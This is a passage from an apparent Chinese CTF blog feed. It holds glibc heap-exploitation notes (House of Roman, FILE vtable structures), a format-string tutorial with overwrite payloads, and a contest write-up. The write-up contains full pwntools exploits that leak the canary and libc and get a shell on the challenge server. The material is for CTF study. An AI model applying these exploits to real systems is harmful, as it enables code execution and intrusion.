class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>此时chunk1对应bin的大小为0xa0；chunk2对应bin的大小为0x50，再申请对应大小堆块即可overlap。</p><h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>通过修改chunk1的fd位指向伪造堆块实现overlap。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chunk1 = malloc(<span class="number">0x40</span>);//<span class="number">0x602000</span></span><br><span class="line">chunk2 = malloc(<span class="number">0x100</span>);//<span class="number">0x602050</span></span><br><span class="line">chunk2[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>;</span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span>;</span><br><span class="line">free(chunk1);</span><br><span class="line">chunk1[<span class="number">0</span>]=<span class="number">0x602060</span>;</span><br><span class="line">malloc(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure><p>此时bin中存在0x50(0x602000)以及0x30(0x602060)，申请即可实现overlap。</p><h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>思路：</p><ul><li>首先分配 <code>3</code> 个 <code>chunk （A , B, C）</code> ，大小分别为 <code>0x20, 0xd0, 0x70</code></li><li>在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></li><li>释放掉 <code>B</code> , <code>B</code> 进入 <code>unsorted bin</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址</li><li>再次分配 <code>0xd0</code> , 会分配到 <code>B</code>， 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中 <code>main_arean</code> 的地址依然存在</li><li>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk (D , E, F)</code>， 为后续做准备</li><li>在 <code>A</code> 触发 单字节溢出，修改 <code>B-&gt;size = 0x71</code> . 然后释放 <code>C , D</code>， 此时 <code>C , D</code> 进入 <code>fastbin</code> , 同时 <code>D-&gt;fd = C</code>. 由于 <code>chunk</code>之间的相对偏移固定，于是利用 <code>uaf</code> 修改 <code>D-&gt;fd</code> 的低 字节 ，使得 <code>D-&gt;fd=B</code></li><li>此时 <code>B-&gt;size = 0x71</code> ，同时 <code>B + 0x78</code> 为 <code>p64(0x61)</code> （第2步设置）， 这就成功伪造了一个 <code>0x70</code> 大小的 <code>fastbin</code>。 此时 <code>B-&gt;fd</code> 为 <code>main_arean</code> 的地址，于是通过 修改 低 <code>2</code>个字节，可以修改到<code>malloc_hook - 0x23</code> 处 （ <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li><li>然后分配 <code>3</code> 次 <code>0x70</code> 的 <code>chunk</code>， 就可以拿到包含 <code>malloc_hook</code> 的 <code>chunk</code>, 此时 <code>malloc_hook</code> 内容为 <code>0</code></li><li>然后利用 <code>unsorted bin</code> 修改 <code>malloc_hook</code> 内容为 <code>main_arean</code> 的地址</li><li>利用部分写修改 <code>malloc_hook</code> 为 <code>one_gadget</code></li><li>多次释放一个指针，触发 <code>double free</code> 异常，进而触发 <code>malloc_printerr</code> ， <code>getshell</code></li></ul><h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House-of-Corrosion"></a>House-of-Corrosion</h3><h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">_IO_FILE file;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注：_IO_FILE是整个嵌入, _IO_jump_t为指针</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="vtable-IO-jump-t"><a href="#vtable-IO-jump-t" class="headerlink" title="vtable IO_jump_t"></a>vtable IO_jump_t</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="vtable-IO-str-jumps"><a href="#vtable-IO-str-jumps" class="headerlink" title="vtable _IO_str_jumps"></a>vtable _IO_str_jumps</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;栈&quot;&gt;&lt;a href=&quot;#栈&quot; class=&quot;headerlink&quot; title=&quot;栈&quot;&gt;&lt;/a&gt;栈&lt;/h1&gt;&lt;h2 id=&quot;stack-pivoting&quot;&gt;&lt;a href=&quot;#stack-pivoting&quot; class=&quot;headerlink&quot; title=&quot;s
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-18T08:42:13.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</p><ol><li>%08x.%08x                            以8位16进制方式输出print函数第一、二个参数</li><li>%p.%p                                与第一个等价</li><li>%3$x                                以8位16进制方式输出print函数第三个参数</li><li>addr%4$x                            以8位16进制方式输出addr对应函数的第四个参数</li><li>[padding][addr]%4$x                        同上，[padding]为填充字符</li></ol><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>…[overwrite addr]….%[overwrite offset]$n                … 表示填充内容，overwrite addr 表示覆盖的地址，overwrite offset 地址表示覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数（$n为0-0xffffffff,$hn为0-0xffff,$hhn为0-0xff）</li><li>[addr of c]%012d%6$n                            覆盖从c为0x10(填充入字符串长度)，%012补充长度至0x10</li><li>a%8$naaa[addr of a]                            覆盖a变量为1，最大可为4(a为填充字符，使地址对齐)</li><li>%016c%8$naaa[addr of a]                            覆盖a变量为0x10</li><li>p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3) + ‘%104c%6$hn’ + ‘%070c%7$hn’+ ‘%036c%8$hn’+ ‘%002c’%9$hn’                覆盖b变量为0xe4e2be78（0xbe=16+104+70,0xe2=16+104+70+36,以此类推，超出256则减去256）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;泄露内存&quot;&gt;&lt;a href=&quot;#泄露内存&quot; class=&quot;headerlink&quot; title=&quot;泄露内存&quot;&gt;&lt;/a&gt;泄露内存&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019第五空间线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/wp/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/wp/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/wp/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:25:42.252Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h3><p>首先覆盖掉seed，去掉rand()的随机化，然后通过输入的name进行格式化字符的泄漏，再通过rop串leak出libc_base，最后直接用one_gadgets getshell,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">7427</span>,<span class="number">39356</span>,<span class="number">9595</span>,<span class="number">54062</span>,<span class="number">67371</span>,<span class="number">42578</span>,<span class="number">92585</span>,<span class="number">76990</span>,<span class="number">22615</span>,<span class="number">53318</span>,<span class="number">12615</span>]</span><br><span class="line"><span class="comment">#p = process('./bf')</span></span><br><span class="line">pop_rdi = <span class="number">0xdb3</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50001</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'%17$p%23$p'</span>+<span class="string">'a'</span>*<span class="number">18</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">vmmap = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xabf</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(vmmap+pop_rdi)+p64(vmmap+<span class="number">0x202018</span>)+p64(vmmap+<span class="number">0x8A0</span>)+p64(vmmap+<span class="number">0XAbf</span>))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr= u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'a'</span>*<span class="number">28</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">print</span> hex(vmmap+<span class="number">0x202018</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x41320</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>edit函数堆溢出，通过改fd破坏fastbin，申请到notes数组附近，利用了stderr高位是0x7f绕过check。然后把第0个格改为puts@got，show(0)来leak libc，再把第0个格改为atoi@got，edit(0)改为system，然后在传choice时传/bin/sh即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50007</span>)</span><br><span class="line">elf= ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dell</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400cea')</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">dell(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">libc_base1 = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span 